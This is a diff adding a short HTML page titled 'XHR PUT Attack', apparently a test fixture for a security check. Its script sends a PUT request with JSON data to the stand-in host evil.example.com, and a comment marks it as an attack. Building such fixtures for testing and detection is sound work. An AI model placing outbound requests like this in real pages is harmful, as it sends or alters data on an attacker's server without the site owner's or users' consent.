@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>XHR PUT Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: XHR PUT request to modify external resource
+    const xhr = new XMLHttpRequest();
+    xhr.open('PUT', 'https://evil.example.com/update', true);
+    xhr.send(JSON.stringify({ modified: 'data' }));
+  </script>
+</body>
+</html>
